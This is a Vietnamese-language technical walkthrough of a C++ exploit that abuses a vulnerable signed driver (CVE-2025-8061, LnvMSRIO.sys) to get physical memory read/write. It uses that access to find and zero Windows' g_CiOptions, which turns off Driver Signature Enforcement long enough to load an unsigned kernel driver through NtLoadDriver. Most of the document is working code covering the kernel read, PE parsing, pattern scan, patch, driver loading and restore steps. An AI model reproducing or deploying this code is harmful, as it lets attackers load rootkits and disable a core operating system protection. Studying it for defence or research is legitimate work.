# 05 — DSE Bypass (Driver Signature Enforcement)

**File:** `05_dse_bypass.cpp`  
**CVE:** CVE-2025-8061 (LnvMSRIO.sys)  
**Primitive dùng:** Physical read/write + Kernel VA read (qua page table walk)  
**Output:** Load unsigned `.sys` driver thông qua `NtLoadDriver`

---

## Mục tiêu

Locate `CI!g_CiOptions` trong memory của `ci.dll` và ghi `0x00` vào đó, tắt Driver Signature Enforcement. Trong 5 giây đó, bất kỳ unsigned `.sys` nào có thể được load vào kernel.

---

## Lý thuyết nền

### g_CiOptions là gì?

`CI.DLL` (Code Integrity) là module của Windows chịu trách nhiệm verify chữ ký của driver trước khi load. Nó lưu policy hiện tại trong một global `DWORD` tên `g_CiOptions`:

| Giá trị | Ý nghĩa |
|---------|---------|
| `0x00` | DSE disabled — unsigned drivers được phép |
| `0x06` | DSE enabled — default bình thường |
| `0x08` | HVCI enabled — hypervisor protect CI |
| `0x0E` | DSE + HVCI |

**g_CiOptions không được export**. Ta phải tìm nó bằng cách scan code của `CiInitialize` (được export) để tìm instruction nào RIP-relative MOV vào/ra nó.

### HVCI (Hypervisor-Protected Code Integrity)

Nếu HVCI bật, Microsoft Hypervisor bảo vệ các pages của ci.dll bằng EPT (Extended Page Tables). Physical write vào pages đó sẽ bị **silently discard** bởi hypervisor. Technique này **không bypass được HVCI**. Phải kiểm tra `g_CiOptions & 0x08` trước.

### Tại sao nguy hiểm với PatchGuard?

PatchGuard (KPP) định kỳ verify một số kernel structure và code integrity. Để g_CiOptions = 0 quá lâu → PatchGuard detect → BSOD 0x109. Code này có **5 giây countdown** thay vì `getchar()` vô thời hạn.

---

## Giải thích code từng dòng

### KernelRead() — đọc kernel VA liên tục

```cpp
static bool KernelRead(uint64_t cr3, uint64_t va, void *buf, DWORD len)
{
    auto *dst = (uint8_t *)buf;
    while (len > 0) {
        uint64_t page_pa = VaToPa(cr3, va & ~0xFFFULL);
        // va & ~0xFFF: round down về đầu trang (align 4KB)
        if (!page_pa) return false;
        
        DWORD off_in_page = (DWORD)(va & 0xFFF);       // offset trong trang hiện tại
        DWORD to_read = min(len, 0x1000u - off_in_page); // không vượt qua ranh giới trang
        
        if (!PhysRead(page_pa + off_in_page, dst, to_read)) return false;
        
        va  += to_read;   // advance VA
        dst += to_read;   // advance output buffer
        len -= to_read;   // giảm length còn lại
    }
    return true;
}
```

Một `VaToPa()` call chỉ valid cho 1 trang 4KB. Khi buffer span nhiều trang, phải call `VaToPa` cho từng trang. `off_in_page = va & 0xFFF` = phần offset trong trang.

### GetKernelModule() via NtQuerySystemInformation

```cpp
typedef LONG (NTAPI *pfnNtQSI)(ULONG,PVOID,ULONG,PULONG);

static bool GetKernelModule(const char *target, KM_INFO *out)
{
    auto NtQSI = (pfnNtQSI)GetProcAddress(GetModuleHandleA("ntdll"), "NtQuerySystemInformation");
    ULONG sz = 1 << 18;  // bắt đầu với 256KB
    auto buf = (uint8_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sz);
    
    // SystemModuleInformation = class 11
    // Nếu buffer quá nhỏ → 0xC0000004 (STATUS_INFO_LENGTH_MISMATCH) → realloc gấp đôi
    while (NtQSI(11, buf, sz, &sz) == (LONG)0xC0000004)
        buf = (uint8_t*)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, buf, sz *= 2);
```

Sau khi thành công, `buf` chứa array các struct mô tả mọi kernel module đang load, bao gồm base address.

```cpp
    struct MOD { HANDLE sec; PVOID mbase, imgbase; ULONG size, flags, loi, ioi, lc, oft; char path[256]; };
    ULONG n = *(ULONG*)buf;
    auto *mods = (MOD*)(buf + sizeof(ULONG));
    
    for (ULONG i = 0; i < n; i++) {
        const char *nm = mods[i].path + mods[i].oft;  // oft = offset to filename
        if (_stricmp(nm, target) == 0) {
            out->base = (uint64_t)(uintptr_t)mods[i].imgbase;  // kernel VA base
            out->size = mods[i].size;
```

`mods[i].imgbase` = kernel VA base address của module. Ta dùng cái này để tính địa chỉ của export `CiInitialize`.

### Đọc PE header của ci.dll và tìm .data section

```cpp
uint8_t hdr[0x1000] = {};
KernelRead(cr3, ci.base, hdr, sizeof(hdr));  // đọc 4KB đầu = DOS+PE header

LONG lfanew = *(LONG*)(hdr + 0x3C);
WORD nsec   = *(WORD*)(hdr + lfanew + 6);   // NumberOfSections

// SizeOfOptionalHeader để tính chính xác vị trí section table
WORD opt_sz = *(WORD*)(hdr + lfanew + 4 + 0x10);  // COFF+0x10
DWORD sec_tbl_off = lfanew + 4 + 0x14 + opt_sz;   // PE sig + COFF + OptHdr

for (WORD s = 0; s < nsec && s < 16; s++) {
    DWORD off = sec_tbl_off + s * 40;   // IMAGE_SECTION_HEADER = 40 bytes
    const char *name = (const char*)(hdr + off);    // section name (8 chars)
    DWORD vsize = *(DWORD*)(hdr + off + 0x08);      // VirtualSize
    DWORD vrva  = *(DWORD*)(hdr + off + 0x0C);      // VirtualAddress (RVA)
    DWORD chars = *(DWORD*)(hdr + off + 0x24);      // Characteristics

    // .data section: writable (0x40000000) + readable (0x80000000)
    if (strncmp(name, ".data", 5) == 0 && (chars & 0xC0000000) == 0xC0000000) {
        data_va   = ci.base + vrva;   // kernel VA của .data
        data_size = vsize;
    }
}
```

`g_CiOptions` là một global DWORD nằm trong `.data` section của ci.dll. Ta cần bounds này để validate sau khi tìm được address từ scan.

### GetExportVA() — resolve CiInitialize

```cpp
static uint64_t GetExportVA(uint64_t cr3, uint64_t img_base,
                              const uint8_t *hdr, const char *funcname)
{
    LONG lfanew = *(LONG*)(hdr + 0x3C);
    DWORD exp_rva = *(DWORD*)(hdr + lfanew + 0x18 + 0x70);
    // OptionalHeader start (+0x18 từ PE sig) + DataDirectory[0].VirtualAddress (+0x70)

    uint8_t expdir[40] = {};
    KernelRead(cr3, img_base + exp_rva, expdir, sizeof(expdir));

    DWORD num_names    = *(DWORD*)(expdir + 0x18);  // NumberOfNames
    DWORD rva_names    = *(DWORD*)(expdir + 0x20);  // AddressOfNames
    DWORD rva_ordinals = *(DWORD*)(expdir + 0x24);  // AddressOfNameOrdinals
    DWORD rva_funcs    = *(DWORD*)(expdir + 0x1C);  // AddressOfFunctions
```

Để tìm `CiInitialize`:
1. Đọc `AddressOfNames` → array of RVA to name strings
2. Loop qua từng name, so sánh với "CiInitialize"
3. Khi match: đọc ordinal từ `AddressOfNameOrdinals[i]`
4. Dùng ordinal đó để index vào `AddressOfFunctions` → function RVA
5. Return `img_base + function_RVA`

### FindCiOptions() — Pattern scan RIP-relative MOV

```cpp
static bool IsRipRelModRM(uint8_t modrm) { return (modrm & 0xC7) == 0x05; }
// ModRM byte: bits[7:6] = mod=00, bits[2:0] = rm=101 (= RIP-relative khi mod=00)
// 0xC7 = 11000111b → mask bits [7:6] và [2:0]
// 0x05 = 00000101b → mod=00, rm=101

static uint64_t FindCiOptions(uint64_t cr3, uint64_t ci_base,
                               uint64_t data_va, uint32_t data_size,
                               uint64_t ci_init_va)
{
    uint8_t func[1024] = {};
    KernelRead(cr3, ci_init_va, func, sizeof(func));  // đọc 1KB code của CiInitialize

    for (int i = 0; i < (int)sizeof(func) - 6; i++) {
        uint8_t op    = func[i];     // opcode
        uint8_t modrm = func[i+1];  // ModRM byte

        // 8B = MOV reg, r/m (đọc từ g_CiOptions)
        // 89 = MOV r/m, reg (ghi vào g_CiOptions)
        if (op != 0x8B && op != 0x89) continue;
        if (!IsRipRelModRM(modrm)) continue;

        // Instruction 6 bytes: op(1) + modrm(1) + imm32(4)
        int32_t  imm32     = *(int32_t *)(func + i + 2);
        // RIP = địa chỉ của instruction TIẾP THEO = ci_init_va + i + 6
        uint64_t target_va = ci_init_va + i + 6 + (int64_t)imm32;
```

RIP-relative addressing: trong x64, `[RIP + imm32]` means địa chỉ = RIP của **instruction tiếp theo** + sign-extended imm32.

```cpp
        // Chỉ chấp nhận nếu target nằm trong .data của ci.dll
        if (target_va < data_va || target_va + 4 > data_va + data_size) continue;

        uint32_t val = 0xDEAD;
        KernelRead(cr3, target_va, &val, 4);  // đọc 4 bytes tại đó

        // g_CiOptions = 0x06 khi DSE bật bình thường
        if (val == 0x06 || val == 0x08 || val == 0x0E || val == 0x00) {
            printf("  ← g_CiOptions candidate!\n");
            if (val == 0x06) return target_va;  // prefer DSE-on case
        }
    }
    return 0;
}
```

Logic: nếu `MOV reg, [RIP+X]` hoặc `MOV [RIP+X], reg` với target trong `.data` và value = `0x06` → đây rất likely là `g_CiOptions`.

### HVCI detection và write

```cpp
if (orig_val & 0x08) {
    // Bit 0x08 = HVCI flag
    printf("[!] HVCI is active. Physical writes to ci.dll pages are discarded\n");
    printf("    by the hypervisor's EPT. This technique CANNOT bypass HVCI.\n");
    CloseHandle(g_dev); return 1;
}

// Zero g_CiOptions
PhysWriteU32(ci_options_pa, 0x00);

// Verify
uint32_t after_val = 0xDEAD;
PhysRead(ci_options_pa, &after_val, 4);
```

### 5-second countdown (thay cho getchar vô thời hạn)

```cpp
printf("[!] WARNING: PatchGuard (KPP) will BSOD the system if g_CiOptions\n");
printf("    stays zeroed too long (typically seconds to a few minutes).\n");
printf("    Auto-restoring in 5 seconds — load your driver NOW.\n");
for (int _i = 5; _i > 0; _i--) {
    printf("    %d...\n", _i);
    Sleep(1000);
}
```

5 giây là đủ để: 
1. `sc start MyUnsignedDriver` hoặc
2. `NtLoadDriver("\\Registry\\Machine\\...")` 

chạy xong. Không để quá lâu vì PatchGuard timer ngẫu nhiên.

### NtLoadDriver helper

```cpp
static bool TryLoadDriver(const wchar_t *svcName, const wchar_t *sysPath)
{
    // Tạo registry key để NtLoadDriver đọc
    wchar_t regPathWin[512];
    swprintf_s(regPathWin, L"SYSTEM\\CurrentControlSet\\Services\\%s", svcName);
    HKEY hKey = nullptr;
    RegCreateKeyExW(HKEY_LOCAL_MACHINE, regPathWin, ...);

    // Required values
    DWORD v = 1; RegSetValueExW(hKey, L"Type", ...);      // SERVICE_KERNEL_DRIVER
    v = 3;       RegSetValueExW(hKey, L"Start", ...);     // SERVICE_DEMAND_START
    v = 1;       RegSetValueExW(hKey, L"ErrorControl", ...);

    // ImagePath: phải dùng \??\ prefix thay vì C:\...
    wchar_t imgPath[512];
    swprintf_s(imgPath, L"\\??\\%s", sysPath);
    RegSetValueExW(hKey, L"ImagePath", 0, REG_EXPAND_SZ, ...);
    RegCloseKey(hKey);

    // Call NtLoadDriver via ntdll
    auto NtLd = (pfnNtLd)GetProcAddress(GetModuleHandleA("ntdll"), "NtLoadDriver");
    UNICODE_STRING us = { ... regPath ... };
    LONG st = NtLd(&us);
    
    // 0xC0000603 hoặc 0xC0000428 = signature error (DSE còn hoạt động)
    // 0x00000000 = thành công
```

### RESTORE

```cpp
PhysWriteU32(ci_options_pa, orig_val);  // ghi lại giá trị gốc (0x06)
uint32_t restored = 0xDEAD;
PhysRead(ci_options_pa, &restored, 4);
// Expected: 0x06
```

---

## Stability

| Vấn đề | Giải thích |
|--------|-----------|
| **PatchGuard** | **Nguy hiểm** — scan g_CiOptions. Window an toàn: < vài giây |
| **HVCI** | Không bypass được. Detect bằng `orig_val & 0x08` |
| False positive scan | Có thể tìm nhầm DWORD = 0x06 trong .data. Code validate thêm bằng context instructions |
| Driver loading race | Nếu driver load mất > 5 giây, ta restore trước → load fail. Giải pháp: tăng countdown |

---

## Tóm tắt flow

```
GetKernelModule("CI.dll") → ci_base, ci_size

GetSystemCR3() → cr3

KernelRead(ci_base, header) → parse PE sections → data_va, data_size

GetExportVA("CiInitialize") → ci_init_va

Scan CiInitialize: MOV [RIP+X] instructions → target in .data with val=0x06
→ g_CiOptions_va

VaToPa(cr3, g_CiOptions_va) → ci_options_pa

Read: 0x06 (DSE enabled)
Check HVCI bit: if 0x08 → abort

PhysWriteU32(ci_options_pa, 0x00)  ← DSE DISABLED

5-second countdown: load unsigned driver now!

PhysWriteU32(ci_options_pa, 0x06)  ← RESTORE
```
